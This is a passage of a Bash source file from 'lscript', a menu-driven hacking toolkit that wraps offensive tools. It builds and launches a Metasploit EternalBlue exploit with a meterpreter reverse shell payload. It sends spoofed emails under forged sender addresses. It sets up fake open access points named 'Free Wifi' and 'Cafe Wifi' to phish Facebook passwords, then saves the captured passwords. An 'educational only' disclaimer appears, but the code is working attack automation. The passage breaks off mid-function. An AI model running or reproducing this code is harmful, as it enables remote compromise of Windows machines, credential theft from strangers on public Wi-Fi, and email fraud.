update?\"$YNONLY\": \"\n\t\t\tread UPDATEYN\n\t\t\tif [[ \"$UPDATEYN\" = \"y\" ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\t#~ echo -e \"Making new directory for the old lscript (will pass it to /root/lscriptold)\"\n\t\t\t\tsleep 1\n\t\t\t\tif [[ -d /root/lscriptold ]]\n\t\t\t\tthen\n\t\t\t\t\trm -r /root/lscriptold\n\t\t\t\tfi\n\t\t\t\tmkdir /root/lscriptold\n\t\t\t\techo -e \"\"\n\t\t\t\t#~ echo -e \"Moving lscript to lscriptold\"\n\t\t\t\tsleep 1\n\t\t\t\tmv \"$LPATH\" /root/lscriptold\n\t\t\t\t#~ echo -e \"Cloning the latest github version to new \"$LPATH\"\"\n\t\t\t\tsleep 1\n\t\t\t\tcd\n\t\t\t\tgit clone https://github.com/arismelachroinos/lscript.git\n\t\t\t\tcd \"$LPATH\"\n\t\t\t\tchmod +x install.sh\n\t\t\t\tclear\n\t\t\t\tsleep 1\n\t\t\t\tif [[ -f /root/lscriptold/lscript/IAGREE.txt ]]\n\t\t\t\tthen\n\t\t\t\t\tcp /root/lscriptold/lscript/IAGREE.txt \"$LPATH\"\n\t\t\t\tfi\n\t\t\t\tif [[ -d /root/lscriptold/lscript/ks ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Copying your shortcuts\"\n\t\t\t\t\tcp -r /root/lscriptold/lscript/ks \"$LPATH\"\n\t\t\t\t\techo -e \"Done.\"\n\t\t\t\t\tsleep 0.2\n\t\t\t\tfi\n\t\t\t\tif [[ -d /root/lscriptold/lscript/settings ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Copying your settings\"\n\t\t\t\t\tcp -r /root/lscriptold/lscript/settings \"$LPATH\"\n\t\t\t\t\techo -e \"Done.\"\n\t\t\t\t\tsleep 0.2\n\t\t\t\tfi\n\t\t\t\tif [[ -f /root/lscriptold/lscript/wlanmon.txt ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Copying your interfaces\"\n\t\t\t\t\tcp /root/lscriptold/lscript/wlanmon.txt \"$LPATH\"\n\t\t\t\t\techo -e \"Done.\"\n\t\t\t\t\tsleep 0.2\n\t\t\t\tfi\n\t\t\t\techo -e \"\"\n\t\t\t\tif [[ -f /root/lscriptold/lscript/wlan.txt ]]\n\t\t\t\tthen\n\t\t\t\t\tcp /root/lscriptold/lscript/wlan.txt \"$LPATH\"\n\t\t\t\t\techo -e \"Done.\"\n\t\t\t\t\tsleep 0.2\n\t\t\t\t\tclear\n\t\t\t\tfi\n\t\t\t\techo -e \"$PAKTC\"\n\t\t\t\t$READAK\n\t\t\t\tcd \"$LPATH\"\n\t\t\t\tgnome-terminal -e ./install.sh\n\t\t\t\tclear \n\t\t\t\tsleep 1\n\t\t\t\trm -rf /root/lscriptold\n\t\t\t\techo -e \"Exiting...\"\n\t\t\t\tsleep 1\n\t\t\t\tkill -9 $PPID\n\t\t\telse \n\t\t\t\tclear\n\t\t\t\techo -e \"You didnt select \"y\" so you go back...\"\n\t\t\t\tsleep 3\n\t\t\t\texec bash \"$0\"\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"There is no update available\"\n\t\t\tsleep 1\n\t\t\techo -e \"Installed version: $VERSION\"\n\t\t\tsleep 1\n\t\t\techo -e \"Github version:    $VER\"\n\t\t\tsleep 1\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\t\n\t\t\texec bash \"$0\"\n\t\tfi\n\telse\n\t\tclear\n\t\techo -e \"There is no connection.\"\n\t\tsleep 1\n\t\techo -e \"Maybe you should type 'stop' in the main manu to gain internet access again\"\n\t\techo -e \"\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\t\texec bash \"$0\"\n\tfi\t\n}\nfunction hidden_shortcuts\n{\n\tclear\n\tTERMINALTITLE=\"HIDDEN SHORTCUTS\"\n\tdash_calc\n\tprintf '\\033]2;HIDDEN SHORTCUTS\\a'\n\techo -e \"\"$YS\"  interface\"$CE\") Change your interface\"\n\techo -e \"\"$YS\"     wififb\"$CE\") Create open wifi access point and get fb passwords with wifiphisher\"\n\techo -e \"\"$YS\"eternalblue\"$CE\") Launch msfconsole with eternalblue exploit on target\"\n\techo -e \"\"$YS\"  etercheck\"$CE\") Check if a target is vulnerable to eternalblue exploit\"\n\techo -e \"\"$YS\"  changelog\"$CE\") View the changelog of the lscript versions\"\n\techo -e \"\"$YS\"     pstart\"$CE\") Service postgresql start\"\n\techo -e \"\"$YS\"      pstop\"$CE\") Service postgresql stop\"\n\techo -e \"\"$YS\"     nstart\"$CE\") Service network-manager start\"\n\techo -e \"\"$YS\"      nstop\"$CE\") Service network-manager stop\"\n\techo -e \"\"$YS\"     astart\"$CE\") Service apache2 start\"\n\techo -e \"\"$YS\"      astop\"$CE\") Service apache2 stop\"\n\techo -e \"\"$YS\"nessusstart\"$CE\") Start Nessus\"\n\techo -e \"\"$YS\" nessusstop\"$CE\") Stop Nessus\"\n\techo -e \"$PAKTGB\"\n\t$READAK\n\tclear\n}\nfunction one_time_per_launch_ks\n{\n\tif [[ -d \"\"$KSPATH\"/nums\" ]]\n\tthen\n\t\trm -r \"$KSPATH\"/nums\n\tfi\n\tmkdir \"$KSPATH\"/nums\n\tnn=1\n\tff=1\n\tHOWMANY=0\n\tHOWADD=$(( HOWMANYTOOLS + 1 )) \n\twhile [[ \"$nn\" != \"$HOWADD\" ]]\n\tdo\n\t\tlistshortcuts\n\t\tif [[ -f \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\" ]]\n\t\tthen\n\t\t\t\techo -e \"$TITLE\" > \"$KSPATH\"/nums/\"$ff\".txt\n\t\t\t\tff=$(( ff+1 ))\n\t\t\t\tHOWMANY=$(( HOWMANY+1 ))\t\t\n\t\tfi\n\t\tnn=$(( nn+1 ))\n\n\tdone\n\tONETIMEPERLAUNCH=\"1\"\n}\nfunction interface_menu\n{\n\tWLANN=$(cat \"$LPATH\"/wlan.txt)\n\tWLANNM=$(cat \"$LPATH\"/wlanmon.txt)\n\techo -e \"Your current wireless interface names are $WLANN and $WLANNM\"\n\tsleep 2\n\techo -e \"Do you want to change you interface names?\"$YNYES\": \"\n\tread INAG\n\tif [[ \"$INAG\" = \"n\" ]]\n\tthen\n\t\tclear\n\t\techo -e \"Then why did you come here? lol\"\n\t\tsleep 3\n\t\texec bash \"$0\"\n\telse\n\t\tclear\n\t\trm \"$LPATH\"/wlan.txt\n\t\trm \"$LPATH\"/wlanmon.txt\n\t\tset_interface_number\n\tfi\n}\nfunction tools_menu\n{\n\twhile true\n\tdo\n\tclear\n\tTERMINALTITLE=\"TOOLS\"\n\tdash_calc\n\tprintf '\\033]2;TOOLS\\a'\n\techo -e \"\"$YS\" 1\"$CE\") Wifi tools\"\n\techo -e \"\"$YS\" 2\"$CE\") Remote access\"\n\techo -e \"\"$YS\" 3\"$CE\") Information gathering\"\n\techo -e \"\"$YS\" 4\"$CE\") Webside tools\"\n\techo -e \"\"$YS\" 5\"$CE\") Others\"\n\techo -e \"\"$YS\" 6\"$CE\") Install/reinstall a tool\"\n\techo -e \"\"$YS\" i\"$CE\") Info\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t#~ echo -e \"\"$YS\"00\"$CE\") Main menu\"\n\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo \"Choose: \"\n\tread -e CATEG\n\tclear\n\t\tif [[ \"$CATEG\" = \"1\" ]]\n\t\tthen\n\t\t\twifi_tools\n\t\telif [[ \"$CATEG\" = \"2\" ]]\n\t\tthen\n\t\t\tremote_access\n\t\telif [[ \"$CATEG\" = \"3\" ]]\n\t\tthen\n\t\t\tinformation_gathering\n\t\telif [[ \"$CATEG\" = \"4\" ]]\n\t\tthen\n\t\t\twebsite_tools\n\t\telif [[ \"$CATEG\" = \"5\" ]]\n\t\tthen\n\t\t\tother_tools\n\t\telif [[ \"$CATEG\" = \"6\" ]]\n\t\tthen\n\t\t\tNOCONFIRM=0\n\t\t\treinstall_tools\n\t\t\tNOCONFIRM=0\n\t\telif [[ \"$CATEG\" = \"0\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\texit\n\t\telif [[ \"$CATEG\" = \"back\" || \"$CATEG\" = \"b\" || \"$CATEG\" = 00 ]]\n\t\tthen\n\t\t\tBACKL=\"1\"\n\t\t\tbreak\n\t\telif [[ \"$CATEG\" = \"i\" ]]\n\t\tthen\n\t\t\tTERMINALTITLE=\"INFO\"\n\t\t\tdash_calc\n\t\t\tprintf '\\033]2;INFO\\a'\n\t\t\techo -e \"\"$LGYS\"Wifi tools:\"\n\t\t\techo -e \"\tMostly focused on network attacks, MITM, DoS, evil-twin and phishing.\"\n\t\t\techo -e \"Remote access:\"\n\t\t\techo -e \"\tMostly focused on payload generation, listeners, exploits, scanners\"\n\t\t\techo -e \"\tand bypassing anti-virus software.\"\n\t\t\techo -e \"Information gathering:\"\n\t\t\techo -e \"\tSelf-explained.\"\n\t\t\techo -e \"Other tools:\"\n\t\t\techo -e \"\tSome very usefull tools that don't fit to the other categories.\"\n\t\t\techo -e \"Install/reinstall a tool:\"\n\t\t\techo -e \"\tFrom here you can install any tool available in the lazy script.\"\n\t\t\techo -e \"\tIf it is already installed, it will be deleted and reistalled.\"$CE\"\"\n\t\t\techo -e \"\"\n\t\t\techo -e \"\"$BS\"Do you want another tool to be added in the script?\"$CE\"\"\n\t\t\techo -e \"\"$BS\"Submit it as an issue on my github repo:\"$CE\"\"\n\t\t\techo -e \"\t\"$YS\"https://github.com/arismelachroinos/lscript\"$CE\"\"\n\t\t\techo -e \"\"\n\t\t\techo -e \"\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\tfi\n\tdone\n}\nfunction public_ip\n{\n\tclear\n\techo -e \"\"$BS\"Please wait...\"$CE\"\"\n\tCHECKMON=$(ifconfig | grep \"mon\")\n\tif [[ \"$CHECKMON\" = \"\" ]]\n\tthen\n\t\tclear\n\t\tPUBLICIP=$(curl -s ipinfo.io/ip)\n\t\tif [[ \"$PUBLICIP\" = \"\" ]]\n\t\tthen\n\t\t\tPUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')\n\t\t\tif [[ \"$PUBLICIP\" = \"\" ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\tPUBLICIP=\"Connection error.\"\n\t\t\tfi\n\t\tfi\n\t\techo \"Your public IP is: \"$PUBLICIP\"\"\n\t\t#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'\n\telse\n\t\techo -e \"When monitor mode is enabled, you don't have internet access.\"\n\t\techo -e \"Select 'd2' to disable monitor mode\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\t\tclear\n\t\texec bash \"$0\"\n\tfi\n}\nfunction terms_of_use\n{\n\tprintf '\\033]2;TERMS OF USE\\a'\n\tclear\n\techo -e \"\"$RS\"You need to accept the terms.\"$CE\"\"\n\tsleep 1\n\techo -e \"$PAKTC\"\n\t$READAK\n\tclear\n\techo -e \"This tool is only for educational purposes only.\"\n\techo -e \"Use this tool only on your own network and never without permission.\"\n\techo -e \"I am not responsible for anything you do with this tool.\"\n\techo -e \"Will you use this tool only on your own network and only with your own responsibility?(\"$YS\"YES\"$CE\"/\"$YS\"NO\"$CE\"): \"\n\tread YESORNO\n\tif [[ \"$YESORNO\" = \"YES\" ]]\n\tthen \n\t\techo \"You have agreed the terms and you use this tool with your own responsibility.\" > \"$LPATH\"/IAGREE.txt\n\t\tsleep 1\n\t\tclear\n\telse\n\t\techo -e \"You didn't type 'YES' , so you cannot continue\"\n\t\tsleep 4\n\tfi\n\texec bash \"$0\"\n}\nfunction eternalblue\n{\n\tif [[ ! -d \"$LPATH\"/rce ]]\n\tthen\n\t\tmkdir\t\"$LPATH\"/rce\n\tfi\n\tEG=$(local_ips $WLANN)\n\tif [[ \"$EG\" != \"\" ]]\n\tthen\n\t\techo -e \"LHOST: (\"$YS\"\"Enter\"\"$CE\"=\"$EG\") \"\n\telse\n\t\techo -e \"LHOST: \"\n\tfi\n\tread LHOSTL\n\tif [[ \"$EG\" != \"\" && \"$LHOSTL\" = \"\" ]]\n\tthen\n\t\tLHOSTL=\"$EG\"\n\tfi\n\techo -e \"RHOST: \"\n\tread RHOSTL\n\techo -e \"TARGETARCHITECTURE(\"$YS\"x86\"$CE\"/\"$YS\"x64\"$CE\"): \"\n\tread TARGETARCHL\n\tif [[ \"$TARGETARCHL\" = \"x64\" ]]\n\tthen\n\t\tPROCESSINJECTL=\"lsass.exe\"\n\t\tPAYLOADL=\"windows/x64/meterpreter/reverse_tcp\"\n\telse\n\t\tPAYLOADL=\"windows/meterpreter/reverse_tcp\"\n\tfi\n\techo -e \"TARGET(\"$YS\"0\"$CE\"-\"$YS\"8\"$CE\"): \"\n\tread TARGETL\n\techo \"use exploit/windows/smb/eternalblue_doublepulsar\" > \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set LHOST \"$LHOSTL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set RHOST \"$RHOSTL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set PAYLOAD \"$PAYLOADL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set TARGET \"$TARGETL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set TARGETARCHITECTURE \"$TARGETARCHL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set PROCESSINJECT \"$PROCESSINJECTL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"show info\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"exploit -j\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\tmsfconsole -r \"$LPATH\"/rce/eternalbluerc.rc\n\t\n}\nfunction eternalblue_check\n{\n\tif [[ ! -d \"$LPATH\"/rce ]]\n\tthen\n\t\tmkdir\t\"$LPATH\"/rce\n\tfi\n\techo -e \"RHOST:(\"$BS\"if scanning multiple hosts, seperate with space\"$CE\") \"\n\tread RHOSTL\n\techo \"use auxiliary/scanner/smb/smb_ms17_010\" > \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"set RHOSTS \"$RHOSTL\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo \"exploit\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\techo -e \"\"$BS\"Launching msfconsole. Please wait...\"$CE\"\"\n\tmsfconsole -r \"$LPATH\"/rce/eternalbluerc.rc\n\t\n}\nfunction start_menu\n{\n\tO1=0\n\tO2=0\n\tO3=0\n\techo -e \"Enabling $WLANNM...\"\n\tenable_wlan\n\techo -e \"Killing services...\"\n\tairmon-ng check kill &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O1=1\n\techo -e \"Starting monitor mode...\"\n\tif [[ \"$ALFA\" = \"yes\" ]]\n\tthen\n\t\tifconfig $WLANN down\n\t\tiwconfig $WLANN mode monitor &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O2=1\n\t\tifconfig $WLANN up\n\telse\n\t\tairmon-ng start $WLANN | grep \"monitor mode\" | awk -F \"(\" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O2=1\n\tfi\n\tif [[ -f \"$LPATH\"/settings/startmac.txt ]]\n\tthen\n\t\tread STARTMAC < \"$LPATH\"/settings/startmac.txt\n\telse\n\t\tSTARTMAC=\"$DEFMAC\"\n\tfi\n\techo -e \"Changing mac address of $WLANNM to \"$STARTMAC\"...\"\n\tifconfig $WLANNM down\n\tmacchanger -m $STARTMAC $WLANNM &> /dev/null | grep \"New MAC:\" &> /dev/null && O3=1\n\tifconfig $WLANNM up && echo -e \"\"$YS\"Done\"$CE\"\" \n\tif [[ \"$O1\" = 1 && \"$O2\" = 1 && \"$O3\" = 1 && \"$O4\" = 1 ]]\n\tthen\n\t\tBACKL=1\n\tfi\n}\nfunction stop_menu\n{\n\tO1=0\n\tO2=0\n\tO3=0\n\tstop_monitor\n\techo -e \"Changing mac address of $WLANN to the original one...\"\n\tifconfig $WLANN down\n\tmacchanger -p $WLANN | grep \"Current MAC:\" && O1=1\n\tifconfig $WLANN up\n\techo -e \"\"$YS\"Done\"$CE\"\"\n\tif [[ \"$O1\" = 1 && \"$O2\" = 1 && \"$O3\" = 1 ]]\n\tthen\n\t\tBACKL=1\n\tfi\n}\nfunction stop_monitor\n{\n\techo -e \"Disabling $WLANNM...\"\n\techo -e \"Stopping monitor mode...\"\n\tif [[ \"$ALFA\" = \"yes\" ]]\n\tthen\n\t\tA1=0\n\t\tA2=0\n\t\tA3=0\n\t\tifconfig $WLANN down && A1=1\n\t\tiwconfig $WLANN mode managed && A2=1\n\t\tifconfig $WLANN up && A3=1\n\t\tif [[ \"$A1\" = 1 && \"$A2\" = 1 && \"$A3\" = 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"Done\"$CE\"\" && O2=1\n\t\telse\n\t\t\techo -e \"\"$RS\"Error stoping monitor mode.\"$CE\"\"\n\t\tfi\n\telse\n\t\tairmon-ng stop $WLANNM &>/dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O2=1 || echo -e \"\"$RS\"Error stoping monitor mode.\"$CE\"\"\n\tfi\n\techo -e \"Starting network-manager service...\"\n\tservice network-manager start && echo -e \"\"$YS\"Done\"$CE\"\" && O3=1 || echo -e \"\"$RS\"Error starting network-manager service\"$CE\"\"\n}\nfunction spoof_email\n{\nwhile true\ndo\n\tsm=0\n\tclear\n\tif [[ ! -d /bin/lscript/smtp ]]\n\tthen\n\t\tmkdir /bin/lscript/smtp\n\tfi\n\techo -e \"\"$RS\"YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL.\"$CE\"\"\n\techo -e \"\"$RS\"THEN GO TO https://app.smtp2go.com/settings/users AND MAKE A USERNAME AND PASS.\"$CE\"\"\n\techo -e \"\"$RS\"      ########ALWAYS HAVE PERMISSION OF THE EMAILS YOU SPOOF########\"$CE\"\"\n\techo -e \"\"$RS\"      ########DONT SEND VIRUSES , PHISHING OR ILLEGAL THINGS########\"$CE\"\"\n\tif [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]\n\tthen\n\t\techo -e \"\"$YS\" 1\"$CE\") Set your SMTP username and pass     \"$RS\"NOT SET\"$CE\"\"\n\telse\n\t\tread smtpemail < /bin/lscript/smtp/smtpemail.txt\n\t\techo -e \"\"$YS\" 1\"$CE\") Set your SMTP username and pass     Current: \"$YS\"\"$smtpemail\"\"$CE\"\"\n\tfi\n\techo -e \"\"$YS\" 2\"$CE\") Send a spoofed email\"\n\techo -e \"\"$YS\" 3\"$CE\") Clear your SMTP username and pass from lscript\"\n\techo -e \"\"$YS\" 4\"$CE\") Fix email failed\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\tread SMTP\n\tif [[ \"$SMTP\" = \"1\" ]]\n\tthen\n\t\tclear\n\t\techo -e \"Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): \"\n\t\tread SMTPEMAIL\n\t\techo -e \"Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): \"\n\t\tread SMTPPASS\n\t\tclear\n\t\techo \"$SMTPEMAIL\" > /bin/lscript/smtp/smtpemail.txt\n\t\techo \"$SMTPPASS\" > /bin/lscript/smtp/smtppass.txt \n\t\techo -e \"Credentials saved on /bin/lscript/smtp\"\n\t\tsleep 3\n\telif [[ \"$SMTP\" = \"4\" ]]\n\tthen\n\t\tclear\t\n\t\techo -e \"If you email fails, the reason is because on option 1 you didnt set the correct username and password. Find those at https://app.smtp2go.com/settings/users.\"\n\t\tsleep 2\n\t\techo -e \"$PAKTGB\"\n\t\tread -e -n 1 -r\n\telif [[ \"$SMTP\" = \"3\" ]]\n\tthen\n\t\tif [[ -f /bin/lscript/smtp/smtpemail.txt ]]\n\t\tthen\n\t\t\trm /bin/lscript/smtp/smtpemail.txt\n\t\t\techo -e \"Username removed\"\n\t\telse\n\t\t\techo -e \"Not username found\"\n\t\tfi\n\t\tif [[ -f /bin/lscript/smtp/smtppass.txt ]]\n\t\tthen\n\t\t\trm /bin/lscript/smtp/smtppass.txt\n\t\t\techo -e \"Password removed\"\n\t\telse\n\t\t\techo -e \"Not password found\"\n\t\tfi\n\t\tsleep 2\n\t\tcontinue\n\telif [[ \"$SMTP\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\telif [[ \"$SMTP\" = \"back\" || \"$SMTP\" = \"b\" ]]\n\tthen\n\t\tclear\n\t\tbreak\n\telif [[ \"$SMTP\" = \"2\" ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\tclear\n\t\tif [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]\n\t\tthen\n\t\t\techo -e \"No smtp username found.\"\n\t\t\tsm=1\n\t\tfi\n\t\tif [[ ! -f /bin/lscript/smtp/smtppass.txt ]]\n\t\tthen\n\t\t\techo -e \"No smtp pass found.\"\n\t\t\tsm=1\n\t\tfi\n\t\tif [[ \"$sm\" = 1 ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\n\t\tread smtppass < /bin/lscript/smtp/smtppass.txt\n\t\tread smtpemail < /bin/lscript/smtp/smtpemail.txt\n\t\tclear\n\t\techo -e \"Your username is \"$RS\"\"$smtpemail\"\"$CE\"\"\n\t\techo -e \"\"\n\t\techo -e \"Enter the target's email: \"\n\t\tread TARGETSEMAIL\n\t\techo -e \"Enter the email that you want the target to see: \"\n\t\tread SPOOFEDEMAIL\n\t\techo -e \"Enter the subject of the message: \"\n\t\tread SUBJECTEMAIL\n\t\techo -e \"Enter the message: \"\n\t\tread MESSAGEEMAIL\n\t\techo -e \"Enter the smtp server (\"$YS\"Enter\"$CE\"=mail.smtp2go.com): \"\n\t\tread SMTPSERVER\n\t\tif [[ \"$SMTPSERVER\" = \"\" ]]\n\t\tthen\n\t\t\tSMTPSERVER=\"mail.smtp2go.com\"\n\t\tfi\n\t\techo -e \"Enter the smtp port (\"$YS\"Enter\"$CE\"=2525): \"\n\t\tread SMTPPORT\n\t\tif [[ \"$SMTPPORT\" = \"\" ]]\n\t\tthen\n\t\t\tSMTPPORT=\"2525\"\n\t\tfi\n\t\techo -e \"Press \"$YS\"enter\"$CE\" to send the message to \"$TARGETSEMAIL\"\"\n\t\tread \n\t\tclear\n\t\tsendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s \"$SMTPSERVER\":\"$SMTPPORT\" -xu \"$smtpemail\" -xp \"$smtppass\"\n\t\techo -e \"$PAKTGB\"\n\t\tread -e -n 1 -r\n\t\tbreak\n\t\tdone\n\tfi\ndone\n}\nfunction new_terminal\n{\n\twhile true\n\tdo\n\tclear\n\tif [[ \"$ALFA\" = \"yes\" ]]\n\tthen\n\t\tCHECKMON=$(iwconfig \"$WLANN\" | grep \"Mode:Monitor\")\n\telse\n\t\tCHECKMON=$(ifconfig | grep \"$WLANNM\")\n\tfi\n\tclear\n\tif [[ \"$CHECKMON\" = \"\" ]]\n\tthen\n\t\techo -e \"Monitor mode is not enabled.\"\n\t\techo -e \"\"\n\t\techo -e \"Do you want to enable monitor mode? \"$YNYES\": \"\n\t\tread MONITOREN\n\t\tclear\n\t\tif [[ \"$MONITOREN\" = \"n\" ]]\n\t\tthen\n\t\t#~ echo -e \"Select 'start' or '2' to enable it\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tclear\n\t\t\texec bash \"$0\"\n\t\telse\n\t\t\tCHECKWL=$(ifconfig | grep \"$WLANN\")\n\t\t\tif [[ \"$CHECKWL\" == \"\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"\"$WLANN\" was not found\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tBACKL=1\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tstart_menu\n\t\t\tcontinue\n\t\tfi\n\telse\n\t\tif [[ \"$YORNAA\" = \"10\" ]]\n\t\tthen\n\t\t\techo -e \"Moving into new terminal...\"\n\t\t\tsleep 1\n\t\t\tFJC=0\n\t\t\texport FJC\n\t\t\tgnome-terminal --geometry 87x35+9999+0 -- lh1\n\t\t\tsleep 1\n\t\t\texec bash \"$0\"\n\t\t\tbreak\n\t\telif [[ \"$YORNAA\" = \"11\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"Moving into new terminal...\"\n\t\t\tsleep 1\n\t\t\tgnome-terminal --geometry 80x25+9999+0 -- lh3\n\t\t\tsleep 1\n\t\t\texec bash \"$0\"\n\t\t\tbreak\n\t\telif [[ \"$YORNAA\" = \"12\" ]]\n\t\tthen\n\t\t\techo -e \"Moving into new terminal...\"\n\t\t\tsleep 1\n\t\t\tgnome-terminal --geometry 80x25+9999+0 -- lh4\n\t\t\tsleep 1\n\t\t\texec bash \"$0\"\n\t\t\tbreak\n\t\tfi\n\tfi\n\tdone\n}\nfunction check_if_ks\n{\n\twhile [ $var1 -le $HOWMANY ]\n\tdo\n\t\tif [[ -f \"$KSPATH\"/nums/\"$var1\".txt ]]\n\t\tthen\n\t\t\tread TITLE < \"$KSPATH\"/nums/\"$var1\".txt\n\t\t\tread YORNAKS < \"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\n\t\t\tif [[ \"$YORNAA\" = \"$YORNAKS\" ]]\n\t\t\tthen\n\t\t\t\tread COMMAND1 < \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\".txt\"\n\t\t\t\tread COMMAND2 < \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\"2.txt\"\n\t\t\t\t$COMMAND1\n\t\t\t\t#~ if [[ -f \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\"3.txt\" ]]\n\t\t\t\t#~ then\n\t\t\t\t\t#~ read $COMMAND3 < \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\"3.txt\"\n\t\t\t\t\t#~ $COMMAND3\n\t\t\t\t#~ fi\n\t\t\t\t$COMMAND2\n\t\t\t\tBACKL=\"1\"\n\t\t\tfi\n\t\tfi\n\t\tvar1=$(( var1+1 ))\n\tdone\n}\nfunction wififb_attack\n{\n\t\n\twhile true\n\tdo\n\t\tclear\n\t\tTERMINALTITLE=\"WIFIFB-MENU\"\n\t\tdash_calc\n\t\tprintf '\\033]2;WIFIFB-MENU\\a'\t\n\t\techo -e \"\"$YS\" 1\"$CE\") Start attack (\"$BS\"always end the attack with ESC\"$CE\")\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Check & save new passwords (\"$BS\"do it at the end of the attack\"$CE\")\"\n\t\techo -e \"\"$YS\" 3\"$CE\") Show all-saved-passwords\"\n\t\techo -e \"\"$YS\" 4\"$CE\") Copy all-saved-passwords file to desktop\"\n\t\techo -e \"\"$YS\" 5\"$CE\") Delete the all-saved-passwords file\"\n\t\techo -e \"\"$YS\" 6\"$CE\") Fix no wifi issue after the attack\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose:\"\n\t\tread wifimenu\n\t\tclear\n\t\tif [[ \"$wifimenu\" == 1 ]]\n\t\tthen\n\t\t\twififb\n\t\telif [[ \"$wifimenu\" == 2 ]]\n\t\tthen\n\t\t\twififb_pass\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\telif [[ \"$wifimenu\" == 3 ]]\n\t\tthen\n\t\t\tif [[ -f $wififbpassfileall ]]\n\t\t\tthen\n\t\t\t\tcat $wififbpassfileall\n\t\t\telse\n\t\t\t\techo -e \"\"$RS\"File not found. Get some paswords first.\"$CE\"\"\n\t\t\tfi\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\telif [[ \"$wifimenu\" == 4 ]]\n\t\tthen\n\t\t\tcp $wififbpassfileall /root/Desktop/all-saved-passwords.txt && echo -e \"Done\"\n\t\telif [[ \"$wifimenu\" == 5 ]]\n\t\tthen\n\t\t\trm $wififbpassfileall && echo -e \"Done\"\n\t\telif [[ \"$wifimenu\" == 6 ]]\n\t\tthen\n\t\t\tnmcli n on\n\t\t\techo -e \"Error fixed, you may need to restart your system\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\telif [[ \"$wifimenu\" == 'b' || \"$wifimenu\" == \"back\" || \"$wifimenu\" == 00 ]]\n\t\tthen\n\t\t\texec bash $0\n\t\tfi\n\tdone\n}\nfunction wififb\n{\n\techo -e \"Access point's name: \"\n\techo -e \" \"$YS\"1\"$CE\") Free Wifi\"\n\techo -e \" \"$YS\"2\"$CE\") FREE WIFI\"\n\techo -e \" \"$YS\"3\"$CE\") Wifi Hotspot\"\n\techo -e \" \"$YS\"4\"$CE\") WIFI HOTSPOT\"\n\techo -e \" \"$YS\"5\"$CE\") Hotspot\"\n\techo -e \" \"$YS\"6\"$CE\") Android Hotspot\"\n\techo -e \" \"$YS\"7\"$CE\") Cafe Wifi\"\n\techo -e \" \"$YS\"8\"$CE\") Public Wifi\"\n\techo -e \" \"$YS\"9\"$CE\") PUBLIC WIFI\"\n\techo -e \"\"$YS\"10\"$CE\") Free Public Wifi\"\n\techo -e \"\"$YS\"11\"$CE\") FREE PUBLIC WIFI\"\n\techo -e \" \"$YS\"c\"$CE\") Custom name\"\n\techo -e \" \"$YS\"b\"$CE\") Go back\"\n\tread wifiind\n\tif [[ \"$wifiind\" == 1 ]]\n\tthen\n\t\twifiname=\"Free Wifi\"\n\telif [[ \"$wifiind\" == 2 